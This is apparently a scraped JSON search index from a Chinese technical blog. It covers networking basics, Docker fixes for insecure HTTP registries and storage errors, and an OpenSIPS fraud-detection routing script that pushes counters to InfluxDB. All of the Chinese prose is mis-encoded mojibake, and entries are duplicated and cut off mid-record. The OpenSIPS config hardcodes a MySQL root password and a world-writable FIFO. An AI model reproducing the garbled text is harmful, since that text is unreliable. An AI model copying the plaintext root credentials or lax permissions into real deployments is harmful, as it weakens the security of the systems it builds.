è¾“è·¯å¾„ï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºè·¯ç”±ï¼›å°†è·¯ç”±å™¨è¾“å…¥ç«¯çš„æ•°æ®åŒ…ç§»é€è‡³é€‚å½“çš„è·¯ç”±å™¨è¾“å‡ºç«¯ï¼ˆåœ¨è·¯ç”±å™¨å†…éƒ¨è¿›è¡Œï¼‰ï¼Œè¿™ç§°ä¸ºè½¬é€ã€‚è·¯ç”±å·¥ä½œåœ¨OSIæ¨¡å‹çš„ç¬¬ä¸‰å±‚â€”â€”å³ç½‘ç»œå±‚ï¼Œä¾‹å¦‚ç½‘é™…åè®®ï¼ˆIPï¼‰ã€‚\nè·¯ç”±å™¨ç”¨æ¥åšç½‘ç»œä¹‹é—´çš„é“¾æ¥ï¼Œæ‰€ä»¥è·¯ç”±å™¨ä¸€èˆ¬è‡³å°‘ä¼šé“¾æ¥åˆ°ä¸¤ä¸ªç½‘ç»œä¸Šã€‚å¸¸è§çš„å°±æ˜¯ä¸€è¾¹è¿æ¥å¤–ç½‘ï¼Œä¸€è¾¹è¿æ¥å†…ç½‘ã€‚\n2. IPåœ°å€ 3. äº¤æ¢æœº 4. äº”å±‚ç½‘ç»œæ¨¡å‹ 5. TCP vs UDP 6. TCP å’Œ UDP å¤´ 7. å¸¸è§çš„ç«¯å£å· 8. å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ 9. Socket 10. Socketå»ºç«‹ 11. ä¸€ä¸ªWebæœåŠ¡å™¨çš„å·¥ä½œè¿‡ç¨‹s step1: æœåŠ¡å™¨åœ¨80ç«¯å£ç›‘å¬æ¶ˆæ¯ step2: å®¢æˆ·ç«¯éšæœºé€‰æ‹©ä¸€ä¸ªç«¯å£ï¼Œå‘æœåŠ¡ç«¯å‘èµ·è¿æ¥è¯·æ±‚ step3: ä¼ è¾“å±‚å°†æ¶ˆæ¯ä¼ è¾“ç»™æœåŠ¡å™¨ æœåŠ¡ç«¯å»ºç«‹ä¸€ä¸ªSocketç”¨æ¥å’Œå®¢æˆ·ç«¯å»ºç«‹é€šé“\nstep4: æœåŠ¡å™¨é€šè¿‡socketå°†htmlå‘ç»™å®¢æˆ·ç«¯ step5: æ¶ˆæ¯æ¥å—å®Œæ¯•ï¼ŒSocketå…³é—­ 12 NAT å‚è€ƒ https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8 ","permalink":"https://wdd.js.org/network/graph-network/","summary":"å›¾ç‰‡æ¥è‡ªÂ https://microchipdeveloper.com/Â åªä¸è¿‡è¿™ä¸ªç½‘ç«™è®¿é—®é€Ÿåº¦å¾ˆæ…¢ï¼Œä½†æ˜¯é‡Œé¢çš„å›¾ç‰‡éå¸¸æœ‰æ„æ€ï¼Œèƒ½å¤Ÿç®€æ´æ˜äº†çš„è¯´æ˜ä¸€ä¸ªæ¦‚å¿µã€‚\nä¸Šå­¦çš„æ—¶å€™ï¼Œæ•°å­¦è€å¸ˆå–œæ¬¢åœ¨è®²è¯¾å‰å…ˆè®²ä¸€äº›æ¦‚å¿µï¼Œç„¶åå†åšé¢˜ã€‚ä½†æ˜¯æˆ‘è§‰å¾—æ¦‚å¿µå¹¶æ²¡æœ‰é‚£ä¹ˆé‡è¦ï¼Œæˆ‘æ›´å–œæ¬¢åšé¢˜ã€‚\nä½†æ˜¯ï¼Œå½“ä½ ç†è§£äº†æ¦‚å¿µåï¼Œå†å»å®æˆ˜ï¼Œå°±æœ‰äº‹åŠåŠŸå€çš„æ•ˆæœã€‚\n1. è·¯ç”±å™¨ è·¯ç”±å™¨ï¼ˆè‹±è¯­ï¼šRouterï¼Œåˆç§°è·¯å¾„å™¨ï¼‰æ˜¯ä¸€ç§ç”µè®¯ç½‘ç»œè®¾å¤‡ï¼Œæä¾›è·¯ç”±ä¸è½¬é€ä¸¤ç§é‡è¦æœºåˆ¶ï¼Œå¯ä»¥å†³å®šæ•°æ®åŒ…ä»æ¥æºç«¯åˆ°ç›®çš„ç«¯æ‰€ç»è¿‡çš„è·¯ç”±è·¯å¾„ï¼ˆhoståˆ°hostä¹‹é—´çš„ä¼ è¾“è·¯å¾„ï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºè·¯ç”±ï¼›å°†è·¯ç”±å™¨è¾“å…¥ç«¯çš„æ•°æ®åŒ…ç§»é€è‡³é€‚å½“çš„è·¯ç”±å™¨è¾“å‡ºç«¯ï¼ˆåœ¨è·¯ç”±å™¨å†…éƒ¨è¿›è¡Œï¼‰ï¼Œè¿™ç§°ä¸ºè½¬é€ã€‚è·¯ç”±å·¥ä½œåœ¨OSIæ¨¡å‹çš„ç¬¬ä¸‰å±‚â€”â€”å³ç½‘ç»œå±‚ï¼Œä¾‹å¦‚ç½‘é™…åè®®ï¼ˆIPï¼‰ã€‚\nè·¯ç”±å™¨ç”¨æ¥åšç½‘ç»œä¹‹é—´çš„é“¾æ¥ï¼Œæ‰€ä»¥è·¯ç”±å™¨ä¸€èˆ¬è‡³å°‘ä¼šé“¾æ¥åˆ°ä¸¤ä¸ªç½‘ç»œä¸Šã€‚å¸¸è§çš„å°±æ˜¯ä¸€è¾¹è¿æ¥å¤–ç½‘ï¼Œä¸€è¾¹è¿æ¥å†…ç½‘ã€‚\n2. IPåœ°å€ 3. äº¤æ¢æœº 4. äº”å±‚ç½‘ç»œæ¨¡å‹ 5. TCP vs UDP 6. TCP å’Œ UDP å¤´ 7. å¸¸è§çš„ç«¯å£å· 8. å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ 9. Socket 10. Socketå»ºç«‹ 11. ä¸€ä¸ªWebæœåŠ¡å™¨çš„å·¥ä½œè¿‡ç¨‹s step1: æœåŠ¡å™¨åœ¨80ç«¯å£ç›‘å¬æ¶ˆæ¯ step2: å®¢æˆ·ç«¯éšæœºé€‰æ‹©ä¸€ä¸ªç«¯å£ï¼Œå‘æœåŠ¡ç«¯å‘èµ·è¿æ¥è¯·æ±‚ step3: ä¼ è¾“å±‚å°†æ¶ˆæ¯ä¼ è¾“ç»™æœåŠ¡å™¨ æœåŠ¡ç«¯å»ºç«‹ä¸€ä¸ªSocketç”¨æ¥å’Œå®¢æˆ·ç«¯å»ºç«‹é€šé“\nstep4: æœåŠ¡å™¨é€šè¿‡socketå°†htmlå‘ç»™å®¢æˆ·ç«¯ step5: æ¶ˆæ¯æ¥å—å®Œæ¯•ï¼ŒSocketå…³é—­ 12 NAT å‚è€ƒ https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8 ","title":"å›¾è§£é€šä¿¡ç½‘ç»œ ç¬¬äºŒç‰ˆ"},{"content":"ä½¿ç”¨HTTPä»“åº“ é»˜è®¤dockerä¸å…è®¸ä½¿ç”¨HTTPçš„ä»“åº“ï¼Œåªå…è®¸HTTPSçš„ä»“åº“ã€‚å¦‚æœä½ ç”¨httpçš„ä»“åº“ï¼Œå¯èƒ½ä¼šæŠ¥å¦‚ä¸‹çš„é”™è¯¯ã€‚\nGet https://registry:5000/v1/_ping: http: server gave HTTP response to HTTPS client\nè§£å†³æ–¹æ¡ˆæ˜¯ï¼šé…ç½®insecure-registriesä½¿dockerä½¿ç”¨æˆ‘ä»¬çš„httpä»“åº“ã€‚\nåœ¨Â /etc/docker/daemon.json æ–‡ä»¶ä¸­æ·»åŠ \n{ \u0026#34;insecure-registries\u0026#34; : [\u0026#34;registry:5000\u0026#34;, \u0026#34;harbor:5000\u0026#34;] } é‡å¯docker\nservice docker restart # æ‰§è¡Œå‘½ä»¤ docker info | grep insecure åº”è¯¥å¯ä»¥çœ‹åˆ°ä¸å®‰å…¨ä»“åº“ å­˜å‚¨é—®é¢˜ æœ‰äº›dockerçš„å­˜å‚¨ç­–ç•¥å¹¶æœªæŒ‡å®šï¼Œåœ¨è¿è¡Œå®¹å™¨æ—¶ï¼Œå¯èƒ½ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯\n/usr/bin/docker-current: Error response from daemon: error creating overlay mount to\nè§£å†³æ–¹æ¡ˆï¼š\nvim /etc/sysconfig/docker-storage\nDOCKER_STORAGE_OPTIONS=\u0026#34;-s overlay\u0026#34; systemctl daemon-reload service docker restart ","permalink":"https://wdd.js.org/posts/2019/07/fpbkzg/","summary":"ä½¿ç”¨HTTPä»“åº“ é»˜è®¤dockerä¸å…è®¸ä½¿ç”¨HTTPçš„ä»“åº“ï¼Œåªå…è®¸HTTPSçš„ä»“åº“ã€‚å¦‚æœä½ ç”¨httpçš„ä»“åº“ï¼Œå¯èƒ½ä¼šæŠ¥å¦‚ä¸‹çš„é”™è¯¯ã€‚\nGet https://registry:5000/v1/_ping: http: server gave HTTP response to HTTPS client\nè§£å†³æ–¹æ¡ˆæ˜¯ï¼šé…ç½®insecure-registriesä½¿dockerä½¿ç”¨æˆ‘ä»¬çš„httpä»“åº“ã€‚\nåœ¨Â /etc/docker/daemon.json æ–‡ä»¶ä¸­æ·»åŠ \n{ \u0026#34;insecure-registries\u0026#34; : [\u0026#34;registry:5000\u0026#34;, \u0026#34;harbor:5000\u0026#34;] } é‡å¯docker\nservice docker restart # æ‰§è¡Œå‘½ä»¤ docker info | grep insecure åº”è¯¥å¯ä»¥çœ‹åˆ°ä¸å®‰å…¨ä»“åº“ å­˜å‚¨é—®é¢˜ æœ‰äº›dockerçš„å­˜å‚¨ç­–ç•¥å¹¶æœªæŒ‡å®šï¼Œåœ¨è¿è¡Œå®¹å™¨æ—¶ï¼Œå¯èƒ½ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯\n/usr/bin/docker-current: Error response from daemon: error creating overlay mount to\nè§£å†³æ–¹æ¡ˆï¼š\nvim /etc/sysconfig/docker-storage\nDOCKER_STORAGE_OPTIONS=\u0026#34;-s overlay\u0026#34; systemctl daemon-reload service docker restart ","title":"Dockerç›¸å…³é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ"},{"content":"# # $Id$ # # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 log_stderror=yes log_facility=LOG_LOCAL0 children=4 memdump=-1 /* uncomment the following line to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:127.0.0.1:5060 # CUSTOMIZE ME listen=udp:10.0.2.8:5060 # CUSTOMIZE ME ####### Modules Section ######## #set module path mpath=\u0026#34;modules/\u0026#34; loadmodule \u0026#34;proto_udp.so\u0026#34; #### SIGNALING module loadmodule \u0026#34;signaling.so\u0026#34; #### StateLess module loadmodule \u0026#34;sl.so\u0026#34; #### Transaction Module loadmodule \u0026#34;tm.so\u0026#34; modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timeout\u0026#34;, 5) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timeout\u0026#34;, 30) modparam(\u0026#34;tm\u0026#34;, \u0026#34;restart_fr_on_each_reply\u0026#34;, 0) modparam(\u0026#34;tm\u0026#34;, \u0026#34;onreply_avp_mode\u0026#34;, 1) #### Record Route Module loadmodule \u0026#34;rr.so\u0026#34; /* do not append from tag to the RR (no need for this script) */ modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) #### MAX ForWarD module loadmodule \u0026#34;maxfwd.so\u0026#34; #### SIP MSG OPerationS module loadmodule \u0026#34;sipmsgops.so\u0026#34; #### FIFO Management Interface loadmodule \u0026#34;mi_fifo.so\u0026#34; modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_name\u0026#34;, \u0026#34;/tmp/opensips_fifo\u0026#34;) modparam(\u0026#34;mi_fifo\u0026#34;, \u0026#34;fifo_mode\u0026#34;, 0666) #### URI module loadmodule \u0026#34;uri.so\u0026#34; modparam(\u0026#34;uri\u0026#34;, \u0026#34;use_uri_table\u0026#34;, 0) #### USeR LOCation module loadmodule \u0026#34;usrloc.so\u0026#34; modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;nat_bflag\u0026#34;, \u0026#34;NAT\u0026#34;) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_mode\u0026#34;, 1) modparam(\u0026#34;usrloc\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://root:summit2017@127.0.0.1/opensips_2_3\u0026#34;) #### REGISTRAR module loadmodule \u0026#34;registrar.so\u0026#34; loadmodule \u0026#34;drouting.so\u0026#34; modparam(\u0026#34;drouting\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://root:summit2017@127.0.0.1/opensips_2_3\u0026#34;) loadmodule \u0026#34;fraud_detection.so\u0026#34; modparam(\u0026#34;fraud_detection\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://root:summit2017@127.0.0.1/opensips_2_3\u0026#34;) loadmodule \u0026#34;event_route.so\u0026#34; loadmodule \u0026#34;cachedb_local.so\u0026#34; #loadmodule \u0026#34;aaa_radius.so\u0026#34; #modparam(\u0026#34;aaa_radius\u0026#34;,\u0026#34;radius_config\u0026#34;,\u0026#34;modules/acc/etc/radius/radiusclient.conf\u0026#34;) #### ACCounting module loadmodule \u0026#34;acc.so\u0026#34; /* what special events should be accounted ? */ #modparam(\u0026#34;acc\u0026#34;, \u0026#34;aaa_url\u0026#34;, \u0026#34;radius:modules/acc/etc/radius/radiusclient.conf\u0026#34;) modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) /* by default we do not adjust the direct of the sequential requests. if you enable this parameter, be sure the enable \u0026#34;append_fromtag\u0026#34; in \u0026#34;rr\u0026#34; module */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) #modparam(\u0026#34;acc\u0026#34;, \u0026#34;multi_leg_info\u0026#34;, \u0026#34;text1=$avp(src);text2=$avp(dst)\u0026#34;) #modparam(\u0026#34;acc\u0026#34;, \u0026#34;multi_leg_bye_info\u0026#34;, \u0026#34;text1=$avp(src);text2=$avp(dst)\u0026#34;) /* account triggers (flags) */ loadmodule \u0026#34;avpops.so\u0026#34; modparam(\u0026#34;avpops\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;1 mysql://root:summit2017@127.0.0.1/opensips_2_3\u0026#34;) loadmodule \u0026#34;db_mysql.so\u0026#34; modparam(\u0026#34;db_mysql\u0026#34;, \u0026#34;exec_query_threshold\u0026#34;, 500000) loadmodule \u0026#34;cfgutils.so\u0026#34; loadmodule \u0026#34;dialog.so\u0026#34; loadmodule \u0026#34;rest_client.so\u0026#34; loadmodule \u0026#34;dispatcher.so\u0026#34; modparam(\u0026#34;dispatcher\u0026#34;, \u0026#34;db_url\u0026#34;, \u0026#34;mysql://root:summit2017@127.0.0.1/opensips_2_3\u0026#34;) ####### Routing Logic ######## # main request routing logic route { if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { sl_send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; } if (has_totag()) { # sequential requests within a dialog should # take the path determined by record-routing if (loose_route()) { if (is_method(\u0026#34;INVITE\u0026#34;)) { # even if in most of the cases is useless, do RR for # re-INVITEs alos, as some buggy clients do change route set # during the dialog. record_route(); } # route it out to whatever destination was set by loose_route() # in $du (destination URI). route(relay); } else { if ( is_method(\u0026#34;ACK\u0026#34;) ) { if ( t_check_trans() ) { # non loose-route, but stateful ACK; must be an ACK after # a 487 or e.g. 404 from upstream server t_relay(); exit; } else { # ACK without matching transaction -\u0026gt; # ignore and discard exit; } } sl_send_reply(\u0026#34;404\u0026#34;,\u0026#34;Not here\u0026#34;); } exit; } if (is_method(\u0026#34;REGISTER\u0026#34;)) { if (!save(\u0026#34;location\u0026#34;)) sl_reply_error(); exit; } # CANCEL processing if (is_method(\u0026#34;CANCEL\u0026#34;)) { if (t_check_trans()) t_relay(); exit; } t_check_trans(); if ( !(is_method(\u0026#34;REGISTER\u0026#34;) ) ) { if (from_uri==myself) { } else { # if caller is not local, then called number must be local } } # preloaded route checking if (loose_route()) { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Attempt to route with preloaded Route\u0026#39;s [$fu/$tu/$ru/$ci]\u0026#34;); if (!is_method(\u0026#34;ACK\u0026#34;)) sl_send_reply(\u0026#34;403\u0026#34;,\u0026#34;Preload Route denied\u0026#34;); exit; } # record routing if (!is_method(\u0026#34;REGISTER|MESSAGE\u0026#34;)) record_route(); # account only INVITEs if (is_method(\u0026#34;INVITE\u0026#34;)) { create_dialog(); do_accounting(\u0026#34;evi\u0026#34;, \u0026#34;cdr|missed|failed\u0026#34;); } if (!uri==myself) { append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); route(relay); } # requests for my domain if (is_method(\u0026#34;PUBLISH|SUBSCRIBE\u0026#34;)) { sl_send_reply(\u0026#34;503\u0026#34;, \u0026#34;Service Unavailable\u0026#34;); exit; } if ($rU==NULL) { # request with no Username in RURI sl_send_reply(\u0026#34;484\u0026#34;,\u0026#34;Address Incomplete\u0026#34;); exit; } if (!check_fraud(\u0026#34;$fU\u0026#34;, \u0026#34;$rU\u0026#34;, \u0026#34;2\u0026#34;)) { send_reply(\u0026#34;403\u0026#34;, \u0026#34;Forbidden\u0026#34;); exit; } $du = \u0026#34;sip:10.0.2.8:7050\u0026#34;; route(relay); } route [relay] { # for INVITEs enable some additional helper routes if (is_method(\u0026#34;INVITE\u0026#34;)) { t_on_branch(\u0026#34;per_branch_ops\u0026#34;); t_on_reply(\u0026#34;handle_nat\u0026#34;); t_on_failure(\u0026#34;missed_call\u0026#34;); } if (!t_relay()) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Internal Error\u0026#34;); }; exit; } branch_route[per_branch_ops] { xlog(\u0026#34;new branch at $ru\\n\u0026#34;); } onreply_route[handle_nat] { xlog(\u0026#34;incoming reply\\n\u0026#34;); } route [ds_route] { xlog(\u0026#34;foo\\n\u0026#34;); } failure_route[missed_call] { if (t_was_cancelled()) { exit; } # uncomment the following lines if you want to block client # redirect based on 3xx replies. ##if (t_check_status(\u0026#34;3[0-9][0-9]\u0026#34;)) { ##t_reply(\u0026#34;404\u0026#34;,\u0026#34;Not found\u0026#34;); ##\texit; ##} } event_route [E_FRD_WARNING] { fetch_event_params(\u0026#34;$var(param);$var(val);$var(thr);$var(user);$var(number);$var(ruleid)\u0026#34;); xlog(\u0026#34;E_FRD_WARNING: $var(param);$var(val);$var(thr);$var(user);$var(number);$var(ruleid)\\n\u0026#34;); if ($var(param) == \u0026#34;calls per minute\u0026#34;) { xlog(\u0026#34;e_frd_cpm++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cpm\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;call_duration\u0026#34;) { xlog(\u0026#34;e_frd_cdur++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cdur\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;total calls\u0026#34;) { xlog(\u0026#34;e_frd_tc++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_tc\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;concurrent calls\u0026#34;) { xlog(\u0026#34;e_frd_cc++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cc\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;sequential calls\u0026#34;) { xlog(\u0026#34;e_frd_seq++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_seq\u0026#34;, 1, 0); } } event_route [E_FRD_CRITICAL] { fetch_event_params(\u0026#34;$var(param);$var(val);$var(thr);$var(user);$var(number);$var(ruleid)\u0026#34;); xlog(\u0026#34;E_FRD_CRITICAL: $var(param);$var(val);$var(thr);$var(user);$var(number);$var(ruleid)\\n\u0026#34;); if ($var(param) == \u0026#34;calls per minute\u0026#34;) { xlog(\u0026#34;e_frd_critcpm++\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcpm\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;call_duration\u0026#34;) { xlog(\u0026#34;e_frd_critcdur++\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcdur\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;total calls\u0026#34;) { xlog(\u0026#34;e_frd_crittc++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_crittc\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;concurrent calls\u0026#34;) { xlog(\u0026#34;e_frd_critcc++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcc\u0026#34;, 1, 0); } else if ($var(param) == \u0026#34;sequential calls\u0026#34;) { xlog(\u0026#34;e_frd_critseq++!\\n\u0026#34;); cache_add(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critseq\u0026#34;, 1, 0); } } route [store_influxdb] { $var(body) = $param(2) + \u0026#34;,host=\u0026#34; + $param(3) + \u0026#34; value=\u0026#34; + $param(4); xlog(\u0026#34;XXX posting: $var(body) ($param(1) / $param(2) / $param(4))\\n\u0026#34;); if (!rest_post(\u0026#34;http://localhost:8086/write?db=$param(1)\u0026#34;, \u0026#34;$var(body)\u0026#34;, , \u0026#34;$var(body)\u0026#34;)) { xlog(\u0026#34;ERR in rest_post!\\n\u0026#34;); exit; } } timer_route [dump_fraud_cpm, 1] { $var(cpm) = 0; $var(ccpm) = 0; cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cpm\u0026#34;, $var(cpm)); cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcpm\u0026#34;, $var(ccpm)); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cpm\u0026#34;); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcpm\u0026#34;); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;cpm\u0026#34;, \u0026#34;serverA\u0026#34;, $var(cpm)); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;critcpm\u0026#34;, \u0026#34;serverA\u0026#34;, $var(ccpm)); xlog(\u0026#34;XXX stats: $var(cpm) / $var(ccpm)\\n\u0026#34;); } timer_route [dump_fraud_cdur, 1] { $var(cdur) = 0; $var(ccdur) = 0; cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cdur\u0026#34;, $var(cdur)); cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcdur\u0026#34;, $var(ccdur)); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cdur\u0026#34;); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcdur\u0026#34;); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;cdur\u0026#34;, \u0026#34;serverA\u0026#34;, $var(cdur)); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;critcdur\u0026#34;, \u0026#34;serverA\u0026#34;, $var(ccdur)); xlog(\u0026#34;XXX stats: $var(cdur) / $var(ccdur)\\n\u0026#34;); } timer_route [dump_fraud_tc, 1] { $var(tc) = 0; $var(ctc) = 0; cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_tc\u0026#34;, $var(tc)); cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_crittc\u0026#34;, $var(ctc)); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_tc\u0026#34;); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_crittc\u0026#34;); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;tc\u0026#34;, \u0026#34;serverA\u0026#34;, $var(tc)); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;crittc\u0026#34;, \u0026#34;serverA\u0026#34;, $var(ctc)); xlog(\u0026#34;XXX stats: $var(tc) / $var(ctc)\\n\u0026#34;); } timer_route [dump_fraud_cc, 1] { $var(cc) = 0; $var(ccc) = 0; cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cc\u0026#34;, $var(cc)); cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcc\u0026#34;, $var(ccc)); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_cc\u0026#34;); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critcc\u0026#34;); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;cc\u0026#34;, \u0026#34;serverA\u0026#34;, $var(cc)); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;critcc\u0026#34;, \u0026#34;serverA\u0026#34;, $var(ccc)); xlog(\u0026#34;XXX stats: $var(cc) / $var(ccc)\\n\u0026#34;); } timer_route [dump_fraud_seq, 1] { $var(seq) = 0; $var(cseq) = 0; cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_seq\u0026#34;, $var(seq)); cache_counter_fetch(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critseq\u0026#34;, $var(cseq)); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_seq\u0026#34;); cache_remove(\u0026#34;local\u0026#34;, \u0026#34;e_frd_critseq\u0026#34;); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;seq\u0026#34;, \u0026#34;serverA\u0026#34;, $var(seq)); route(store_influxdb, \u0026#34;fraud_demo\u0026#34;, \u0026#34;critseq\u0026#34;, \u0026#34;serverA\u0026#34;, $var(cseq)); xlog(\u0026#34;XXX stats: $var(seq) / $var(cseq)\\n\u0026#34;); } ","permalink":"https://wdd.js.org/opensips/ch8/fraud/","summary":"# # $Id$ # # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 log_stderror=yes log_facility=LOG_LOCAL0 children=4 memdump=-1 /* uncomment the following line to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:127.","title":"opensips-summit-fraud"},{"content":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 memdump=1 log_stderror=yes log_facility=LOG_LOCAL0 children=10 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on revers DNS on IPs */ auto_aliases=no listen=udp:192.168.56.1:5070 # CUSTOMIZE ME ####### Modules Section ######## #set module path mpath=\u0026#34;modules/\u0026#34; loadmodule \u0026#34;httpd.so\u0026#34; modparam(\u0026#34;httpd\u0026#34;, \u0026#34;port\u0026#34;, 8081) loadmodule \u0026#34;mi_json.so\u0026#34; #### SIGNALING module loadmodule \u0026#34;signaling.so\u0026#34; #### StateLess module loadmodule \u0026#34;sl.so\u0026#34; #### Transaction Module loadmodule \u0026#34;tm.so\u0026#34; modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_timeout\u0026#34;, 2) modparam(\u0026#34;tm\u0026#34;, \u0026#34;fr_inv_timeout\u0026#34;, 30) modparam(\u0026#34;tm\u0026#34;, \u0026#34;restart_fr_on_each_reply\u0026#34;, 0) modparam(\u0026#34;tm\u0026#34;, \u0026#34;onreply_avp_mode\u0026#34;, 1) loadmodule \u0026#34;cachedb_local.so\u0026#34; loadmodule \u0026#34;mathops.so\u0026#34; modparam(\u0026#34;mathops\u0026#34;, \u0026#34;decimal_digits\u0026#34;, 12) loadmodule \u0026#34;rest_client.so\u0026#34; #### Record Route Module loadmodule \u0026#34;rr.so\u0026#34; /* do not append from tag to the RR (no need for this script) */ modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) #### MAX ForWarD module loadmodule \u0026#34;maxfwd.so\u0026#34; #### SIP MSG OPerationS module loadmodule \u0026#34;sipmsgops.so\u0026#34; #### FIFO Management Interface loadmodule 